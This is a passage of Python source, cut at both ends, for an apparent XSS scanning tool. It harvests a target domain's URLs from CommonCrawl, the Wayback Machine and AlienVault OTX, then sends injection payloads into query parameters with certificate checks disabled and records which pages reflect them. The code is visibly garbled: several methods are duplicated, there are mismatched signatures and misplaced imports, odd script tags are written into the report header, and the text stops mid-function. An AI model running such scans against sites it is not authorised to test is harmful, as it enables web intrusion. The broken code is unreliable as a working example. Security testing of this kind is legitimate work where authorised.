                    if urls_list and len(urls_list) > 1:  # Ensure there's data beyond the header
                        for url in urls_list[1:]:  # Skip the header row
                            if url:  # Add a safety check to ensure non-empty URLs
                                final_url_list.add(url[0])
                elif source.lower() == "commoncrawl":
                    print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Fetching URLs from CommonCrawl...")
                    api_list = [
                        "http://index.commoncrawl.org/CC-MAIN-2024-10-index",
                        "http://index.commoncrawl.org/CC-MAIN-2023-06-index"
                    ]
                    for api in api_list:
                        url = f"{api}?url={wild_card+domain}/*&fl=url"
                        raw_urls = make_get_request(url, "text")
                        if raw_urls and ("No Captures found" not in raw_urls):
                            urls_list = raw_urls.split("\n")
                            final_url_list.update(url.strip() for url in urls_list if url.strip())
                else:
                    print(f"[!] Unknown source: {source}")
            except Exception as e:
                print(f"[!] Error fetching from {source}: {e}")

        return list(final_url_list)



    def start(self):
        try:
            if self.deepcrawl:
                self.startDeepCommonCrawl()
            else:
                self.getCommonCrawlURLs(
                    self.domain,
                    self.want_subdomain,
                    ["http://index.commoncrawl.org/CC-MAIN-2018-22-index"]
                )
        except Exception as e:
            print(f"[!] CommonCrawl failed: {e}. Switching to WaybackMachine and AlienVault.")

        try:
            wayback_urls = self.getWaybackURLs(self.domain, self.want_subdomain)
            self.final_url_list.update(wayback_urls)
        except Exception as e:
            print(f"[!] WaybackMachine failed: {e}. Moving to AlienVault.")

        try:
            alienvault_urls = self.getOTX_URLs(self.domain)
            self.final_url_list.update(alienvault_urls)
        except Exception as e:
            print(f"[!] AlienVault failed: {e}. Unable to fetch URLs.")

        self.url_list = list(self.final_url_list)
        return self.url_list

    def getCommonCrawlURLs(self, domain, want_subdomain, apiList):
        try:
            if want_subdomain:
                wild_card = "*."
            else:
                wild_card = ""
            final_urls_list = set()
            for api in apiList:
                url = f"{api}?url={wild_card+domain}/*&fl=url"
                raw_urls = self.make_GET_Request(url, "text")
                if raw_urls and ("No Captures found" not in raw_urls):
                    urls_list = raw_urls.split("\n")
                    final_urls_list.update(url.strip() for url in urls_list if url.strip())
            self.final_url_list.update(final_urls_list)
        except Exception as e:
            print(f"[!] Error fetching CommonCrawl URLs: {e}.")
            raise  # Ensure fallback triggers

    def getWaybackURLs(self, domain, want_subdomain):
        wild_card = "*." if want_subdomain else ""
        url = f"http://web.archive.org/cdx/search/cdx?url={wild_card+domain}/*&output=json&collapse=urlkey&fl=original"
        urls_list = self.make_GET_Request(url, "json")
        final_urls_list = set()
        if urls_list:
            for url in urls_list[1:]:  # Skip the header
                final_urls_list.add(url[0])
        return list(final_urls_list)

    def getOTX_URLs(self, domain):
        url = f"https://otx.alienvault.com/api/v1/indicators/hostname/{domain}/url_list"
        raw_urls = self.make_GET_Request(url, "json")
        final_urls_list = set()
        if raw_urls and "url_list" in raw_urls:
            for url_data in raw_urls["url_list"]:
                final_urls_list.add(url_data["url"])
        return list(final_urls_list)
    
class XSSScanner:
    def __init__(self, domain, url_list, threadNumber, report_file, skip_duplicate, use_filters, payload=None, duration=None):
        self.url_list = url_list
        self.threadNumber = threadNumber
        self.domain = domain
        self.vulnerable_urls = []
        self.report_file = report_file
        self.payload = payload
        self.skip_duplicate = skip_duplicate
        self.use_filters = use_filters  # Number of filters to use
        self.url_test_counts = {}  # Dictionary to track URL test counts
        self.stop_scan = False
        self.links_discovered = len(url_list)  # Initialize links_discovered
        self.links_audited = 0  # Initialize links_audited
        self.duration = duration  # Duration to run the scan
        signal.signal(signal.SIGINT, self.handle_ctrl_c)
        if duration:
            timer_thread = threading.Thread(target=self.quit_after_duration)
            timer_thread.daemon = True
            timer_thread.start()


    import html

    def sanitize_payload(payload):
        """
        Sanitize payloads to neutralize potentially harmful scripts or code.
        """
        # Escape HTML special characters to prevent rendering
        sanitized_payload = html.escape(payload)
        # Replace potentially harmful functions with harmless text
        sanitized_payload = sanitized_payload.replace("alert", "[alert disabled]")
        sanitized_payload = sanitized_payload.replace("confirm", "[confirm disabled]")
        sanitized_payload = sanitized_payload.replace("eval", "[eval disabled]")
        return sanitized_payload

    def save_to_html_file(self, vulnerable_urls):
        """
        Save all vulnerable URLs and their payloads to a formatted HTML file.
        Includes options to download CSV and Excel files for Business Intelligence tools.
        """
        try:
            # Ensure the domain is set
            if not hasattr(self, 'domain') or not self.domain:
                self.domain = "Unknown Domain"

            # Create output folders if they do not exist
            OUTPUT_FOLDER = "reports"
            HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
            os.makedirs(HTML_FOLDER, exist_ok=True)

            # Generate dynamic filenames based on current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            csv_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.csv")
            excel_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.xlsx")
            json_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.json")
            html_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.html")

            # Save data to CSV, Excel, and JSON files
            df = pd.DataFrame(vulnerable_urls, columns=["URL", "Payload"])
            df.to_csv(csv_file, index=False)
            df.to_excel(excel_file, index=False)
            df.to_json(json_file, orient="records", lines=True)
            js_code = '<script>function alert({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeb = '<script>function confirm({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codec = '<script>function eval({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coded = '<script>function img({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codee = '<script>function src({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codef = '<script>function iframe({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeg = '<script>function javascript({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeh = '<script>function form({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codei = '<script>function a({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codej = '<script>function object({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codek = '<script>function swf({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codel = '<script>function table({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codem = '<script>function div({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coden = '<script>function td({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeo = '<script>function object type({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codep = '<script>function svg({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeq = '<script>function style({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            # Generate the HTML report
            with open(html_file, "w") as file:
                file.write(
                    f"""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>XSS Vulnerabilities Report</title>
                        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
                    {js_code}
                    {js_codeb}
                    {js_codec}
                    {js_coded}
                    {js_codee}
                    {js_codef}
                    {js_codeg}
                    {js_codeh}
                    {js_codei}
                    {js_codej}
                    {js_codek}
                    {js_codel}
                    {js_codem}
                    {js_coden}
                    {js_codeo}
                    {js_codep}
                    {js_codeq}
                    </head>
                    <body>
                        <div class="container py-5">
                            <h1 class="text-center text-danger">XSS Vulnerabilities Report</h1>
                            <p class="text-muted text-center"><strong>Report generated on:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                            <p class="text-muted text-center"><strong>Target Domain:</strong> <span class="text-primary">{self.domain}</span></p>
                            
                            <div class="mb-4">
                                <h2>Summary</h2>
                                <div class="row">
                                    <div class="col-md-6">
                                        <p><strong>Total Links Audited:</strong> <span class="text-primary">{len(self.url_list)}</span></p>
                                    </div>
                                    <div class="col-md-6">
                                        <p><strong>Total Vulnerabilities Found:</strong> <span class="text-danger">{len(vulnerable_urls)}</span></p>
                                    </div>
                                </div>
                            </div>

                            <h2 class="mt-4">Vulnerable URLs</h2>
                            <table class="table table-bordered table-striped table-hover">
                                <thead class="table-dark">
                                    <tr>
                                        <th>#</th>
                                        <th>URL</th>
                                        <th>Payload</th>
                                    </tr>
                                </thead>
                                <tbody>
                    """
                )

                # Add table rows for each vulnerability
                for idx, (payload_url, payload) in enumerate(vulnerable_urls, start=1):
                    sanitized_url = html.escape(payload_url)  # Escape the URL
                    sanitized_payload = sanitize_payload(payload)  # Sanitize the payload
                    file.write(
                        f"""
                        <tr>
                            <td>{idx}</td>
                            <td>{sanitized_url}</td>
                            <td>{sanitized_payload}</td>
                        </tr>
                        """
                    )

                # Add download links and close HTML tags
                file.write(
                    f"""
                                </tbody>
                            </table>

                            <div class="mt-4">
                                <h3>Download Options</h3>
                                <a href="{os.path.basename(csv_file)}" class="btn btn-primary">Download CSV</a>
                                <a href="{os.path.basename(excel_file)}" class="btn btn-success">Download Excel</a>
                                <a href="{os.path.basename(json_file)}" class="btn btn-warning">Download JSON</a>
                            </div>
                        </div>
                    </body>
                    </html>
                    """
                )

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTML report saved to {html_file}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] CSV, Excel, and JSON files generated.")
        except Exception as e:
            print(f"Error saving to HTML file: {e}")



    def save_to_text_file(self, vulnerable_urls):
        """
        Save a payload URL to a dynamically named text file in the text folder.
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            vulnerable_urls_filename = os.path.join(TEXT_FOLDER, f"vulnerable_urls_{timestamp}.txt")
            with open(vulnerable_urls_filename, 'a') as file:
                file.write(vulnerable_urls + "\n")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Vulnerable URL saved to {vulnerable_urls_filename}")
        except OSError as e:
            print(f"Error saving vulnerable URL to text file: {e}")

    def store_vulnerabilities_in_sqlite(self):
        try:
            conn = sqlite3.connect('vulnerabilities.db')
            cursor = conn.cursor()
            # Create table if not exists
            cursor.execute('''CREATE TABLE IF NOT EXISTS vulnerabilities (
                                id INTEGER PRIMARY KEY AUTOINCREMENT,
                                url TEXT NOT NULL,
                                payload TEXT NOT NULL,
                                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
                            )''')
            # Insert vulnerabilities
            for url, payload in self.vulnerable_urls:
                cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
            conn.commit()
            conn.close()
            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}  Vulnerabilities stored in SQLite database. {Style.RESET_ALL} ")
        except Exception as e:
            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED} Error storing vulnerabilities in database: {Style.RESET_ALL} {e}" )



    def generate_report(self):
        try:
            env = Environment(loader=FileSystemLoader('.'))
            env.globals['enumerate'] = enumerate  # Ensure Jinja2 templates have access to enumerate
            template = env.get_template('report_template.html')
            
            report_data = {
                'timestamp': current_time,
                'vulnerable_urls': self.vulnerable_urls,
                'total_links_audited': len(self.url_list),
                'total_vulnerabilities': len(self.vulnerable_urls)
            }

            report_html = template.render(report_data)
            with open(self.report_file, 'w') as report_file:
                report_file.write(report_html)
            print(f"[{current_time}] HTML report generated: {self.report_file}")
        except Exception as e:
            print(f"Error generating report: {e}")


    def scan_urls_for_xss(self, url, output_failed_payloads=True):
        successful_payloads = []
        failed_payloads = []

        # Increment test count for the URL and check duplicate limit
        self.url_test_counts[url] = self.url_test_counts.get(url, 0) + 1
        if self.url_test_counts[url] > self.skip_duplicate:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Skipping duplicate URL: {url}")
            return successful_payloads

        # Parse query parameters
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)

        # Skip irrelevant parameters (e.g., files, images, etc.)
        file_related_keywords = ["path", "image", "jquery", "download", "preloaded"]
        filtered_params = [
            param for param in query_params if not any(keyword in param.lower() for keyword in file_related_keywords)
        ]

        if not filtered_params:
            print(
    f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]{Style.RESET_ALL} "  # Timestamp
    f"{Fore.RED}No valid parameters found{Style.RESET_ALL} in URL: {Fore.CYAN}{url}{Style.RESET_ALL}. "  # Highlighting the 'No valid parameters' and URL
    f"{Fore.MAGENTA}Testing with advanced heuristics.{Style.RESET_ALL}"  # Highlighting the heuristics testing part
)

            
            # Common parameter names and additional ones from heuristics
            common_params = ['id', 'page', 'url', 'query', 'search', 'ref', 'cat', 'name', 'item', 'file']
            dummy_payloads = [f"{url}?{param}={payload}" for param, payload in zip(common_params, xss_payloads[:10])]
            
            heuristic_results = []
            for dummy_payload_url in dummy_payloads:
                try:
                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                    status_code = response.status_code
                    response_text = response.text.lower()

                    # Heuristic scoring based on response analysis
                    score = 0

                    if status_code == 200:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +5")

                    if any(payload.lower() in response_text for payload in xss_payloads[:10]):
                        score += 10
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload found in response. Score: +10")

                    if "error" in response_text or "invalid" in response_text:
                        score += 3
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.YELLOW}[Error/Invalid Found]{Style.RESET_ALL} 'Error' or 'Invalid' detected in response. Score: +3")

                    if "query" in response_text or "parameter" in response_text:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.CYAN}[Query/Parameter Found]{Style.RESET_ALL} Query-related keywords detected. Score: +5")

                    if len(response_text) > 1000:
                        score += 2
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.BLUE}[Long Response]{Style.RESET_ALL} Response length exceeds 1000 characters. Score: +2")

                    heuristic_results.append((dummy_payload_url, score))

                except requests.RequestException as e:
                    print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for dummy payload {dummy_payload_url}: {e}")

            # Sort by heuristic scores in descending order
            heuristic_results.sort(key=lambda x: x[1], reverse=True)

            # Test top-scoring candidates
            for test_url, score in heuristic_results[:5]:  # Limit further tests to top 5
                try:
                    response = requests.get(test_url, verify=False, timeout=3)
                    if response.status_code == 200 and any(payload in response.text for payload in xss_payloads[:10]):
                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found with heuristic endpoint: {test_url}")
                        successful_payloads.append((test_url, "Heuristic Test"))
                        self.save_to_text_file(test_url)
                except requests.RequestException as e:
                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} Request error during heuristic refinement for {test_url}: {e}")

            return successful_payloads


        # Test each payload against the filtered parameters
        selected_filters = xss_payloads[:self.use_filters]  # Apply the specified number of filters
        for param in filtered_params:
            for payload in selected_filters:
                payload_url = f"{url}?{param}={payload}"
                try:
                    response = requests.get(payload_url, verify=False, timeout=3)

                    if self.stop_scan:
                        return successful_payloads

                    if response.status_code == 200 and payload in response.text:
                        print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}Potential XSS vulnerability found: {payload_url}")
                        successful_payloads.append((payload_url, payload))
                        self.save_to_text_file(payload_url)
                        self.save_to_html_file(payload_url, payload)
                    else:
                        failed_payloads.append((payload_url, payload))

                except requests.RequestException as e:
                    print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} Request error for {payload_url}: {e}")

        if output_failed_payloads:
            for payload_url, payload in failed_payloads:
                print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.RED}Payload failed: {Style.RESET_ALL} {payload_url}")

        return successful_payloads

    def quit_after_duration(self):
        time.sleep(self.duration)
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Duration of {self.duration} seconds reached. Saving progress and exiting...{Style.RESET_ALL} ")
        self.stop_scan = True
        self.finalize_scan()
        sys.exit(0)

    def handle_ctrl_c(self, signum, frame):
        print(f"\n[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN}Ctrl+C detected. Saving progress and exiting...{Style.RESET_ALL}")
        self.stop_scan = True
        self.finalize_scan()
        sys.exit(0)

    def log_event(self, message):
        try:
            with open("scan.log", "a") as log_file:
                log_file.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {message}\n")
        except OSError as e:
            print(f"Error writing to log file: {e}")



    def save_to_text_file(self, vulnerable_urls):
        """
        Save a payload URL to a dynamically named text file in the text folder.
        """
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            vulnerable_urls_filename = os.path.join(TEXT_FOLDER, f"vulnerable_urls_{timestamp}.txt")
            with open(vulnerable_urls_filename, 'a') as file:
                file.write(vulnerable_urls + "\n")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Vulnerable URL saved to {vulnerable_urls_filename}")
        except OSError as e:
            print(f"Error saving vulnerable URL to text file: {e}")


    def save_to_html_file(self, vulnerable_urls):
        """
        Save all vulnerable URLs and their payloads to a formatted HTML file.
        Includes options to download CSV and Excel files for Business Intelligence tools.
        """
        try:
            # Ensure the domain is set
            if not hasattr(self, 'domain') or not self.domain:
                self.domain = "Unknown Domain"

            # Create output folders if they do not exist
            OUTPUT_FOLDER = "reports"
            HTML_FOLDER = os.path.join(OUTPUT_FOLDER)
            os.makedirs(HTML_FOLDER, exist_ok=True)

            # Generate dynamic filenames based on current timestamp
            timestamp = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
            csv_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.csv")
            excel_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.xlsx")
            json_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.json")
            html_file = os.path.join(HTML_FOLDER, f"vulnerable_urls_{timestamp}.html")

            # Save data to CSV, Excel, and JSON files
            df = pd.DataFrame(vulnerable_urls, columns=["URL", "Payload"])
            df.to_csv(csv_file, index=False)
            df.to_excel(excel_file, index=False)
            df.to_json(json_file, orient="records", lines=True)
            js_code = '<script>function alert({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeb = '<script>function confirm({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codec = '<script>function eval({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coded = '<script>function img({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codee = '<script>function src({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codef = '<script>function iframe({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeg = '<script>function javascript({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeh = '<script>function form({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codei = '<script>function a({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codej = '<script>function object({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codek = '<script>function swf({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codel = '<script>function table({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codem = '<script>function div({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_coden = '<script>function td({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeo = '<script>function object type({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codep = '<script>function svg({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            js_codeq = '<script>function style({{}})</script>'  # Use {{}} to escape the curly braces in f-string
            # Generate the HTML report
            with open(html_file, "w") as file:
                file.write(
                    f"""
                    <!DOCTYPE html>
                    <html lang="en">
                    <head>
                        <meta charset="UTF-8">
                        <meta name="viewport" content="width=device-width, initial-scale=1.0">
                        <title>XSS Vulnerabilities Report</title>
                        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">
                    {js_code}
                    {js_codeb}
                    {js_codec}
                    {js_coded}
                    {js_codee}
                    {js_codef}
                    {js_codeg}
                    {js_codeh}
                    {js_codei}
                    {js_codej}
                    {js_codek}
                    {js_codel}
                    {js_codem}
                    {js_coden}
                    {js_codeo}
                    {js_codep}
                    {js_codeq}
                    </head>
                    <body>
                        <div class="container py-5">
                            <h1 class="text-center text-danger">XSS Vulnerabilities Report</h1>
                            <p class="text-muted text-center"><strong>Report generated on:</strong> {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
                            <p class="text-muted text-center"><strong>Target Domain:</strong> <span class="text-primary">{self.domain}</span></p>
                            
                            <div class="mb-4">
                                <h2>Summary</h2>
                                <div class="row">
                                    <div class="col-md-6">
                                        <p><strong>Total Links Audited:</strong> <span class="text-primary">{len(self.url_list)}</span></p>
                                    </div>
                                    <div class="col-md-6">
                                        <p><strong>Total Vulnerabilities Found:</strong> <span class="text-danger">{len(vulnerable_urls)}</span></p>
                                    </div>
                                </div>
                            </div>

                            <h2 class="mt-4">Vulnerable URLs</h2>
                            <table class="table table-bordered table-striped table-hover">
                                <thead class="table-dark">
                                    <tr>
                                        <th>#</th>
                                        <th>URL</th>
                                        <th>Payload</th>
                                    </tr>
                                </thead>
                                <tbody>
                    """
                )

                # Add table rows for each vulnerability
                for idx, (payload_url, payload) in enumerate(vulnerable_urls, start=1):
                    sanitized_url = html.escape(payload_url)  # Escape the URL
                    sanitized_payload = sanitize_payload(payload)  # Sanitize the payload
                    file.write(
                        f"""
                        <tr>
                            <td>{idx}</td>
                            <td>{sanitized_url}</td>
                            <td>{sanitized_payload}</td>
                        </tr>
                        """
                    )

                # Add download links and close HTML tags
                file.write(
                    f"""
                                </tbody>
                            </table>

                            <div class="mt-4">
                                <h3>Download Options</h3>
                                <a href="{os.path.basename(csv_file)}" class="btn btn-primary">Download CSV</a>
                                <a href="{os.path.basename(excel_file)}" class="btn btn-success">Download Excel</a>
                                <a href="{os.path.basename(json_file)}" class="btn btn-warning">Download JSON</a>
                            </div>
                        </div>
                    </body>
                    </html>
                    """
                )

            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] HTML report saved to {html_file}")
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] CSV, Excel, and JSON files generated.")
        except Exception as e:
            print(f"Error saving to HTML file: {e}")



    def store_single_vulnerability_in_sqlite(self, url, payload):
        try:
            conn = sqlite3.connect('vulnerabilities.db')
            cursor = conn.cursor()
            cursor.execute('INSERT INTO vulnerabilities (url, payload) VALUES (?, ?)', (url, payload))
            conn.commit()
            conn.close()
        except sqlite3.Error as e:
            print(f"Error storing single vulnerability: {e}")

    def finalize_scan(self):
        if self.vulnerable_urls:
            # Save the list of vulnerabilities to an HTML report
            self.save_to_html_file(self.vulnerable_urls)

            # Store vulnerabilities in the SQLite database
            self.store_vulnerabilities_in_sqlite()

            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Vulnerabilities saved successfully. {Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} HTML report, database entries, and other output files have been created. {Style.RESET_ALL}")
        else:
            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} No vulnerabilities found to save. {Style.RESET_ALL}")
            print(f"\n{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Exiting...{Style.RESET_ALL}")



    def save_extracted_urls(self):
        try:
            extracted_urls_filename = f"extracted_url_links_{datetime.now().strftime('%Y-%m-%d')}.txt"
            with open(extracted_urls_filename, 'w') as file:
                for url in self.url_list:
                    file.write(url + "\n")
            print(f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL}{Fore.CYAN} Extracted URLs saved to {extracted_urls_filename}{Style.RESET_ALL}")
        except OSError as e:
            print(f"Error saving extracted URLs: {e}")

    def start(self):
        # Count and display the number of discovered links and parameters
        discovered_links = len(self.url_list)
        discovered_params = sum(len(parse_qs(urlparse(url).query)) for url in self.url_list)
        print(f"{Fore.YELLOW}[{current_time}] Discovered {discovered_links} links{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[{current_time}] Discovered {discovered_params} parameters{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[{current_time}] Now implementing logic to capture XSS vulnerabilities{Style.RESET_ALL}")

        # Remove duplicates and save extracted URLs
        self.url_list = list(set(self.url_list))
        self.save_extracted_urls()

        with ThreadPoolExecutor(max_workers=int(self.threadNumber)) as executor:
            results = list(executor.map(self.scan_urls_for_xss, self.url_list))

        # Flatten results and store vulnerabilities
        self.vulnerable_urls = [url for sublist in results for url in sublist]
        if self.report_file:
            self.store_vulnerabilities_in_sqlite()
            self.generate_report()

        return self.vulnerable_urls


    def scan_urls_for_xss(self, url, output_failed_payloads=True):
        successful_payloads = []
        failed_payloads = []
        tested_filenames = set()  # Track tested filenames

        # Parse the URL and extract the filename
        parsed_url = urlparse(url)
        filename = parsed_url.path

        # Check if the filename has already been tested
        if filename in tested_filenames:
            print(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Skipping duplicate filename: {filename}")
            return successful_payloads

        tested_filenames.add(filename)  # Mark filename as tested

        # Parse query parameters
        query_params = parse_qs(parsed_url.query)

        # Skip irrelevant parameters (e.g., files, images, etc.)
        file_related_keywords = ["file", "path", "image", "jquery", "download", "preloaded"]
        filtered_params = [
            param for param in query_params if not any(keyword in param.lower() for keyword in file_related_keywords)
        ]

        if not filtered_params:
            print(
    f"{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]{Style.RESET_ALL} "  # Timestamp
    f"{Fore.RED}No valid parameters found{Style.RESET_ALL} in URL: {Fore.CYAN}{url}{Style.RESET_ALL}. "  # Highlighting the 'No valid parameters' and URL
    f"{Fore.MAGENTA}Testing with advanced heuristics.{Style.RESET_ALL}"  # Highlighting the heuristics testing part
)

            
            # Common parameter names and additional ones from heuristics
            common_params = ['id', 'page', 'url', 'query', 'search', 'ref', 'cat', 'name', 'item', 'file']
            dummy_payloads = [f"{url}?{param}={payload}" for param, payload in zip(common_params, xss_payloads[:10])]
            
            heuristic_results = []
            for dummy_payload_url in dummy_payloads:
                try:
                    response = requests.get(dummy_payload_url, verify=False, timeout=3)
                    status_code = response.status_code
                    response_text = response.text.lower()

                    # Heuristic scoring based on response analysis
                    score = 0

                    if status_code == 200:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.GREEN}[200 OK]{Style.RESET_ALL} Status code indicates success. Score: +5")

                    if any(payload.lower() in response_text for payload in xss_payloads[:10]):
                        score += 10
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.MAGENTA}[Payload Match]{Style.RESET_ALL} XSS payload found in response. Score: +10")

                    if "error" in response_text or "invalid" in response_text:
                        score += 3
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.YELLOW}[Error/Invalid Found]{Style.RESET_ALL} 'Error' or 'Invalid' detected in response. Score: +3")

                    if "query" in response_text or "parameter" in response_text:
                        score += 5
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.CYAN}[Query/Parameter Found]{Style.RESET_ALL} Query-related keywords detected. Score: +5")

                    if len(response_text) > 1000:
                        score += 2
                        print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.BLUE}[Long Response]{Style.RESET_ALL} Response length exceeds 1000 characters. Score: +2")

                    heuristic_results.append((dummy_payload_url, score))

                except requests.RequestException as e:
                    print(f" {Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} {Fore.RED}[Request Error]{Style.RESET_ALL}{Fore.YELLOW}[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {Style.RESET_ALL} for dummy payload {dummy_payload_url}: {e}")

            # Sort by heuristic scores in descending order
            heuristic_results.sort(key=lambda x: x[1], reverse=True)

            # Test top-scoring candidates
